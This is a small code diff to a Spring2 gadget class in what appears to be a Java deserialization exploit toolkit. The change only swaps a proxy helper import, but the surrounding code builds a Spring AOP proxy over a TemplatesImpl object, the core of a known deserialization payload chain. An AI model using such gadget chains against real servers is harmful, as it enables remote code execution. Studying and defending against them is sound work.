@@ -11,6 +11,7 @@ import javax.xml.transform.Templates;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Type;
 
+import static com.qi4l.JYso.gadgets.JDKUtil.createProxy;
 import static java.lang.Class.forName;
 
 /**
@@ -43,7 +44,7 @@ public class Spring2 implements ObjectPayload<Object> {
         AdvisedSupport as = new AdvisedSupport();
         as.setTargetSource(new SingletonTargetSource(templates));
 
-        final Type typeTemplatesProxy = Gadgets.createProxy(
+        final Type typeTemplatesProxy = createProxy(
                 (InvocationHandler) Reflections.getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy").newInstance(as),
                 Type.class,
                 Templates.class);
